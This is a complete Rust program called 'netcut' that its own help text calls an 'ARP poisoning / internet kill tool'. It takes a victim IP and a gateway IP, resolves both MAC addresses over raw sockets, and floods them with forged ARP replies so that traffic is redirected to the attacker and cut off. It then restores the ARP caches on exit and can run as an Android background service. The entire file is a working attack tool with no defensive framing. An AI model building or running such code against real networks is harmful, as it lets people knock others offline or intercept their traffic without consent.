use anyhow::{anyhow, Context, Result};
use clap::Parser;
use libc::{
    c_int, c_void, close, if_nametoindex, ioctl, sendto, setsockopt, socket, sockaddr,
    sockaddr_ll, socklen_t, AF_PACKET, ETH_ALEN, ETH_P_ARP, IFNAMSIZ, SIOCGIFADDR,
    SIOCGIFHWADDR, SOCK_RAW, SOL_SOCKET, SO_BINDTODEVICE,
};
use signal_hook::consts::{SIGINT, SIGTERM};
use signal_hook::iterator::Signals;
use std::mem::{size_of, zeroed};
use std::net::Ipv4Addr;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::thread;
use std::time::{Duration, Instant};

// -------- CLI --------

#[derive(Parser, Debug)]
#[command(name = "netcut", about = "ARP poisoning / internet kill tool (libc raw sockets)")]
struct Args {
    /// Network interface (e.g., wlan0)
    #[arg(short, long)]
    iface: String,

    /// Target IP (victim)
    #[arg(short, long)]
    target: Ipv4Addr,

    /// Gateway IP (router)
    #[arg(short, long)]
    gateway: Ipv4Addr,

    /// Kill mode: full (both directions) or half (target->gateway only)
    #[arg(long, default_value = "full")]
    kill_mode: String,

    /// Packets-per-second rate
    #[arg(long, default_value_t = 4)]
    rate: u64,

    /// Max seconds to wait for MAC resolution
    #[arg(long, default_value_t = 15)]
    resolve_timeout: u64,

    /// Enable Android service mode (monitor parent process)
    #[arg(long, default_value_t = false)]
    android_service: bool,

    /// Parent PID to monitor (for Android service mode)
    #[arg(long)]
    parent_pid: Option<i32>,
}

// -------- ioctl request type shim (glibc vs bionic) --------
#[cfg(target_env = "gnu")]
type IoctlReq = libc::c_ulong;
#[cfg(not(target_env = "gnu"))]
type IoctlReq = libc::c_int;

// -------- ifreq layout --------

#[repr(C)]
union IfrIfru {
    ifru_addr: sockaddr,
    ifru_hwaddr: sockaddr,
    ifru_flags: libc::c_short,
    ifru_ivalue: libc::c_int,
    ifru_mtu: libc::c_int,
    ifru_data: *mut c_void,
    _pad: [u8; 24],
}

#[repr(C)]
struct Ifreq {
    ifr_name: [libc::c_char; IFNAMSIZ],
    ifr_ifru: IfrIfru,
}

impl Ifreq {
    fn new(iface: &str) -> Result<Self> {
        if iface.len() >= IFNAMSIZ {
            return Err(anyhow!("interface name too long"));
        }
        let mut req: Ifreq = unsafe { zeroed() };
        for (i, b) in iface.as_bytes().iter().enumerate() {
            req.ifr_name[i] = *b as libc::c_char;
        }
        Ok(req)
    }
}

// -------- Ethernet / ARP frame --------

#[repr(C, packed)]
#[derive(Clone, Copy)]
struct ArpFrame {
    eth_dst: [u8; 6],
    eth_src: [u8; 6],
    eth_type: u16, // BE: 0x0806
    htype: u16,    // BE: 1
    ptype: u16,    // BE: 0x0800
    hlen: u8,      // 6
    plen: u8,      // 4
    oper: u16,     // BE: 1 request / 2 reply
    sha: [u8; 6],
    spa: [u8; 4],
    tha: [u8; 6],
    tpa: [u8; 4],
}

impl ArpFrame {
    fn as_bytes(&self) -> &[u8] {
        unsafe {
            std::slice::from_raw_parts(
                (self as *const ArpFrame) as *const u8,
                size_of::<ArpFrame>(),
            )
        }
    }
}

fn build_arp_reply(
    src_mac: [u8; 6],
    dst_mac: [u8; 6],
    spoofed_ip: Ipv4Addr,
    target_ip: Ipv4Addr,
) -> ArpFrame {
    ArpFrame {
        eth_dst: dst_mac,
        eth_src: src_mac,
        eth_type: 0x0806u16.to_be(),
        htype: 1u16.to_be(),
        ptype: 0x0800u16.to_be(),
        hlen: 6,
        plen: 4,
        oper: 2u16.to_be(),
        sha: src_mac,
        spa: spoofed_ip.octets(),
        tha: dst_mac,
        tpa: target_ip.octets(),
    }
}

fn build_arp_request(
    src_mac: [u8; 6],
    sender_ip: Ipv4Addr,
    target_ip: Ipv4Addr,
) -> ArpFrame {
    ArpFrame {
        eth_dst: [0xff; 6],
        eth_src: src_mac,
        eth_type: 0x0806u16.to_be(),
        htype: 1u16.to_be(),
        ptype: 0x0800u16.to_be(),
        hlen: 6,
        plen: 4,
        oper: 1u16.to_be(),
        sha: src_mac,
        spa: sender_ip.octets(),
        tha: [0; 6],
        tpa: target_ip.octets(),
    }
}

// -------- Raw socket --------

struct RawSock {
    fd: c_int,
}

impl RawSock {
    fn new(protocol: u16) -> Result<Self> {
        let proto = i32::from(protocol.to_be());
        let fd = unsafe { socket(AF_PACKET, SOCK_RAW, proto) };
        if fd < 0 {
            return Err(std::io::Error::last_os_error()).context("socket(AF_PACKET, SOCK_RAW)");
        }
        Ok(Self { fd })
    }

    fn bind_to_device(&self, iface: &str) -> Result<()> {
        let bytes = iface.as_bytes();
        let rc = unsafe {
            setsockopt(
                self.fd,
                SOL_SOCKET,
                SO_BINDTODEVICE,
                bytes.as_ptr() as *const c_void,
                bytes.len() as socklen_t,
            )
        };
        if rc < 0 {
            return Err(std::io::Error::last_os_error()).context("SO_BINDTODEVICE");
        }
        Ok(())
    }

    fn send_frame(&self, frame: &[u8], ifindex: i32) -> Result<()> {
        let mut sll: sockaddr_ll = unsafe { zeroed() };
        sll.sll_family = AF_PACKET as u16;
        sll.sll_protocol = (ETH_P_ARP as u16).to_be();
        sll.sll_ifindex = ifindex;
        sll.sll_halen = ETH_ALEN as u8;
        sll.sll_addr[..6].copy_from_slice(&frame[0..6]);

        let sent = unsafe {
            sendto(
                self.fd,
                frame.as_ptr() as *const c_void,
                frame.len(),
                0,
                &sll as *const sockaddr_ll as *const sockaddr,
                size_of::<sockaddr_ll>() as socklen_t,
            )
        };
        if sent < 0 {
            return Err(std::io::Error::last_os_error()).context("sendto");
        }
        Ok(())
    }
}

impl Drop for RawSock {
    fn drop(&mut self) {
        unsafe { close(self.fd) };
    }
}

// -------- Interface info --------

fn get_iface_mac(iface: &str) -> Result<[u8; 6]> {
    let fd = unsafe { socket(libc::AF_INET, libc::SOCK_DGRAM, 0) };
    if fd < 0 {
        return Err(std::io::Error::last_os_error()).context("socket(AF_INET) for ioctl");
    }
    let mut req = Ifreq::new(iface)?;
    let rc = unsafe { ioctl(fd, SIOCGIFHWADDR as IoctlReq, &mut req as *mut _) };
    let err = std::io::Error::last_os_error();
    unsafe { close(fd) };
    if rc < 0 {
        return Err(err).context("SIOCGIFHWADDR");
    }
    let sa = unsafe { &req.ifr_ifru.ifru_hwaddr };
    let mut mac = [0u8; 6];
    for i in 0..6 {
        mac[i] = sa.sa_data[i] as u8;
    }
    Ok(mac)
}

fn get_iface_ipv4(iface: &str) -> Result<Ipv4Addr> {
    let fd = unsafe { socket(libc::AF_INET, libc::SOCK_DGRAM, 0) };
    if fd < 0 {
        return Err(std::io::Error::last_os_error()).context("socket(AF_INET) for ioctl");
    }
    let mut req = Ifreq::new(iface)?;
    let rc = unsafe { ioctl(fd, SIOCGIFADDR as IoctlReq, &mut req as *mut _) };
    let err = std::io::Error::last_os_error();
    unsafe { close(fd) };
    if rc < 0 {
        return Err(err).context("SIOCGIFADDR");
    }
    let sa = unsafe { &req.ifr_ifru.ifru_addr };
    let ip = Ipv4Addr::new(
        sa.sa_data[2] as u8,
        sa.sa_data[3] as u8,
        sa.sa_data[4] as u8,
        sa.sa_data[5] as u8,
    );
    Ok(ip)
}

fn get_iface_index(iface: &str) -> Result<i32> {
    let cname = std::ffi::CString::new(iface).context("iface name has NUL")?;
    let idx = unsafe { if_nametoindex(cname.as_ptr()) };
    if idx == 0 {
        return Err(std::io::Error::last_os_error()).context("if_nametoindex");
    }
    Ok(idx as i32)
}

// -------- MAC resolution --------

fn resolve_mac(
    iface: &str,
    our_mac: [u8; 6],
    our_ip: Ipv4Addr,
    target_ip: Ipv4Addr,
    ifindex: i32,
    timeout: Duration,
    stop: &Arc<AtomicBool>,
) -> Result<[u8; 6]> {
    let resolver = RawSock::new(ETH_P_ARP as u16)?;
    resolver.bind_to_device(iface)?;

    let tv = libc::timeval {
        tv_sec: 0,
        tv_usec: 250_000,
    };
    unsafe {
        setsockopt(
            resolver.fd,
            SOL_SOCKET,
            libc::SO_RCVTIMEO,
            &tv as *const _ as *const c_void,
            size_of::<libc::timeval>() as socklen_t,
        );
    }

    let req = build_arp_request(our_mac, our_ip, target_ip);
    let deadline = Instant::now() + timeout;
    let mut last_send = Instant::now() - Duration::from_secs(60);
    let mut buf = [0u8; 1500];

    while Instant::now() < deadline && !stop.load(Ordering::Relaxed) {
        if last_send.elapsed() >= Duration::from_millis(500) {
            if let Err(e) = resolver.send_frame(req.as_bytes(), ifindex) {
                eprintln!("[!] ARP request send error: {e}");
            }
            last_send = Instant::now();
        }

        let n = unsafe { libc::recv(resolver.fd, buf.as_mut_ptr() as *mut c_void, buf.len(), 0) };
        if n < 0 {
            let e = std::io::Error::last_os_error();
            if let Some(code) = e.raw_os_error() {
                if code == libc::EAGAIN || code == libc::EWOULDBLOCK || code == libc::EINTR {
                    continue;
                }
            }
            return Err(e).context("recv while resolving MAC");
        }
        let n = n as usize;
        if n < size_of::<ArpFrame>() {
            continue;
        }
        let eth_type = u16::from_be_bytes([buf[12], buf[13]]);
        if eth_type != 0x0806 {
            continue;
        }
        let oper = u16::from_be_bytes([buf[20], buf[21]]);
        if oper != 2 {
            continue;
        }
        let spa = Ipv4Addr::new(buf[28], buf[29], buf[30], buf[31]);
        if spa != target_ip {
            continue;
        }
        let mut mac = [0u8; 6];
        mac.copy_from_slice(&buf[22..28]);
        return Ok(mac);
    }

    Err(anyhow!("timed out resolving MAC for {}", target_ip))
}

// -------- Utility --------

fn format_mac(m: &[u8; 6]) -> String {
    format!(
        "{:02x}:{:02x}:{:02x}:{:02x}:{:02x}:{:02x}",
        m[0], m[1], m[2], m[3], m[4], m[5]
    )
}

// -------- Parent process monitoring --------

fn is_process_alive(pid: i32) -> bool {
    unsafe {
        let ret = libc::kill(pid, 0);
        ret == 0
    }
}

fn monitor_parent(pid: i32, running: &Arc<AtomicBool>, stop: &Arc<AtomicBool>) {
    let running = running.clone();
    let stop = stop.clone();

    thread::spawn(move || {
        while running.load(Ordering::SeqCst) {
            if !is_process_alive(pid) {
                eprintln!("[*] Parent process {} terminated, stopping...", pid);
                running.store(false, Ordering::SeqCst);
                stop.store(true, Ordering::Release);
                break;
            }
            thread::sleep(Duration::from_millis(500));
        }
    });
}

// -------- Main --------

fn main() -> Result<()> {
    // Ignore SIGPIPE so a closed stdout doesn't kill us mid-restore
    unsafe {
        libc::signal(libc::SIGPIPE, libc::SIG_IGN);
    }

    let args = Args::parse();

    let ifindex = get_iface_index(&args.iface)?;
    let src_mac = get_iface_mac(&args.iface)?;
    let src_ip = get_iface_ipv4(&args.iface)?;
    eprintln!(
        "[*] iface={} ifindex={} mac={} ip={}",
        args.iface,
        ifindex,
        format_mac(&src_mac),
        src_ip
    );

    // Shutdown flags
    let running = Arc::new(AtomicBool::new(true));
    let stop = Arc::new(AtomicBool::new(false));

    // Set up signal handling for both SIGINT and SIGTERM using signal-hook
    {
        let running = running.clone();
        let stop = stop.clone();

        // Create a signal handler that catches both SIGINT and SIGTERM
        let mut signals = Signals::new(&[SIGINT, SIGTERM])
            .context("failed to register signal handlers")?;

        // Spawn a thread to handle signals
        thread::spawn(move || {
            for signal in signals.forever() {
                match signal {
                    SIGINT => {
                        eprintln!("\n[*] Received SIGINT (Ctrl+C), shutting down...");
                        running.store(false, Ordering::SeqCst);
                        stop.store(true, Ordering::Release);
                        break;
                    }
                    SIGTERM => {
                        eprintln!("[*] Received SIGTERM, shutting down...");
                        running.store(false, Ordering::SeqCst);
                        stop.store(true, Ordering::Release);
                        break;
                    }
                    _ => unreachable!(),
                }
            }
        });
    }

    // Start parent process monitoring if in Android service mode
    if args.android_service {
        if let Some(parent_pid) = args.parent_pid {
            eprintln!(
                "[*] Android service mode enabled, monitoring parent PID: {}",
                parent_pid
            );
            monitor_parent(parent_pid, &running, &stop);
        } else {
            eprintln!("[!] Android service mode requires --parent-pid");
            return Err(anyhow!("missing parent PID"));
        }
    }

    // Resolve target/gateway MACs
    let timeout = Duration::from_secs(args.resolve_timeout);

    eprintln!("[*] Resolving target MAC...");
    let target_mac = resolve_mac(
        &args.iface,
        src_mac,
        src_ip,
        args.target,
        ifindex,
        timeout,
        &stop,
    )
    .with_context(|| format!("resolving MAC of target {}", args.target))?;
    eprintln!("[+] Target MAC: {}", format_mac(&target_mac));

    eprintln!("[*] Resolving gateway MAC...");
    let gateway_mac = resolve_mac(
        &args.iface,
        src_mac,
        src_ip,
        args.gateway,
        ifindex,
        timeout,
        &stop,
    )
    .with_context(|| format!("resolving MAC of gateway {}", args.gateway))?;
    eprintln!("[+] Gateway MAC: {}", format_mac(&gateway_mac));

    // Sending socket
    let sock = RawSock::new(ETH_P_ARP as u16)?;
    sock.bind_to_device(&args.iface)?;

    // Poison frames
    // Tell target: gateway is at our MAC
    let poison_target = build_arp_reply(src_mac, target_mac, args.gateway, args.target);
    // Tell gateway: target is at our MAC
    let poison_gateway = build_arp_reply(src_mac, gateway_mac, args.target, args.gateway);

    let full_mode = args.kill_mode.eq_ignore_ascii_case("full");
    let interval = Duration::from_millis(1000 / args.rate.max(1));

    eprintln!(
        "[*] Poisoning ({} mode) at {} pps... Ctrl+C to stop",
        args.kill_mode, args.rate
    );

    while running.load(Ordering::SeqCst) {
        // Check if stop was triggered by parent monitoring
        if stop.load(Ordering::Acquire) {
            break;
        }

        let _ = sock.send_frame(poison_target.as_bytes(), ifindex);
        if full_mode {
            let _ = sock.send_frame(poison_gateway.as_bytes(), ifindex);
        }
        thread::sleep(interval);
    }

    // ---- Aggressive restore ----
    eprintln!("[*] Restoring ARP caches...");
    // Direct restores (unicast, correct mappings)
    let restore_target = build_arp_reply(gateway_mac, target_mac, args.gateway, args.target);
    let restore_gateway = build_arp_reply(target_mac, gateway_mac, args.target, args.gateway);
    // Gratuitous ARPs (broadcast) — help everyone re-learn quickly
    let gratuitous_gateway = build_arp_reply(gateway_mac, [0xff; 6], args.gateway, args.gateway);
    let gratuitous_target = build_arp_reply(target_mac, [0xff; 6], args.target, args.target);

    for _ in 0..20 {
        let _ = sock.send_frame(restore_target.as_bytes(), ifindex);
        let _ = sock.send_frame(restore_gateway.as_bytes(), ifindex);
        let _ = sock.send_frame(gratuitous_gateway.as_bytes(), ifindex);
        let _ = sock.send_frame(gratuitous_target.as_bytes(), ifindex);
        thread::sleep(Duration::from_millis(50));
    }

    eprintln!("[+] Restore complete.");
    Ok(())
}